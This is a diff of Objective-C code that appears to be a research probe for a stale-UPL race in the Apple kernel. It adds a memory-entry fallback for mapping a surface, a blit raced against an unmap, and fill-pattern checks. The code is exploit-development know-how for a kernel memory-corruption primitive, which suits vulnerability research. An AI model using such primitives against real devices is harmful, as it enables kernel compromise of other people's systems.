@@ -57,7 +57,7 @@
 #import <unistd.h>
 #import <sys/mman.h>
 
-#define P119_BUILD      @"p119-staleupl-v3"
+#define P119_BUILD      @"p119-staleupl-v4"
 
 /* the P069 prototype law: mach_vm has no SDK header for these decls */
 kern_return_t mach_vm_map(vm_map_t target_task, mach_vm_address_t *address,
@@ -66,6 +66,12 @@ kern_return_t mach_vm_map(vm_map_t target_task, mach_vm_address_t *address,
                           boolean_t copy, vm_prot_t cur_protection, vm_prot_t max_protection,
                           vm_inherit_t inheritance);
 kern_return_t mach_vm_deallocate(vm_map_t target, mach_vm_address_t address, mach_vm_size_t size);
+kern_return_t mach_make_memory_entry_64(vm_map_t target_task,
+                                        mach_vm_size_t *size,
+                                        memory_object_offset_t offset,
+                                        vm_prot_t permission,
+                                        mach_port_t *object_handle,
+                                        mem_entry_name_port_t parent_handle);
 #define P119_FILL_OLD   0x41   /* the attached backing's paint   */
 #define P119_FILL_STG   0x11   /* the staging buffer's paint     */
 #define P119_FILL_NEW   0x43   /* the replaced backing's paint   */
@@ -106,6 +112,7 @@ static void Lf(NSString *fmt, ...) {
 
 static id<MTLDevice> g_dev;
 static id<MTLCommandQueue> g_q;
+static mach_port_t g_entry_port;
 static id<MTLBuffer> g_mbuf, g_stage;
 static void *g_ref;
 static p119Detach_t g_detach;
@@ -405,13 +412,34 @@ static NSString *p119_finish(void) {
                                             VM_PROT_READ | VM_PROT_WRITE,
                                             VM_INHERIT_NONE);
             if (mkr != KERN_SUCCESS) {
+                /* v4: kr=0x1d on the surface port = the fleet's P069 law —
+                   the route = the MEMORY ENTRY fallback (their device-proven
+                   class: make the entry over the surface, map THE entry). */
+                mach_vm_size_t m6sz = 4096;
+                mach_port_t ep = MACH_PORT_NULL;
+                kern_return_t k64 = mach_make_memory_entry_64(mach_task_self(), &m6sz,
+                    0, VM_PROT_READ | VM_PROT_WRITE, &ep, mp);
+                if (k64 == KERN_SUCCESS && ep) {
+                    mkr = mach_vm_map(mach_task_self(), &addr, m6sz, 0, VM_FLAGS_ANYWHERE,
+                                      ep, 0, FALSE,
+                                      VM_PROT_READ | VM_PROT_WRITE,
+                                      VM_PROT_READ | VM_PROT_WRITE,
+                                      VM_INHERIT_NONE);
+                    if (mkr == KERN_SUCCESS) {
+                        atomic_fetch_add(&g_unmap_ok, 0); /* the map ok = entry route */
+                        /* keep the entry port alive for the unmap arm below */
+                        g_entry_port = ep;               /* one per round; released after the race step */
+                        goto map_ok;
+                    }
+                    mach_port_deallocate(mach_task_self(), ep);
+                }
                 atomic_fetch_add(&b_map_fail, 1);
                 if (printed_fail++ < 4)
-                    Lf(@"[1b] mach_vm_map kr=0x%08x (iter=%d) — the P069 route "
-                       @"failed; printing the law instead of silence", mkr, iter);
+                    Lf(@"[1b] map kr=0x%08x entry-kr=0x%08x (iter=%d) — both arms failed; loud", mkr, k64, iter);
                 mach_port_deallocate(mach_task_self(), mp);
                 continue;
             }
+        map_ok:;
             /* queued blit (NO wait) — its UPL is captured at submit */
             id<MTLCommandBuffer> cb = nil;
             @autoreleasepool {
@@ -447,6 +475,8 @@ static NSString *p119_finish(void) {
                     memset(s, P119_FILL_STG, scan);
                 }
             }
+            if (g_entry_port) { mach_port_deallocate(mach_task_self(), g_entry_port); g_entry_port = MACH_PORT_NULL; }
+            mach_port_deallocate(mach_task_self(), mp);
         bnext:
             usleep(1000);
         }
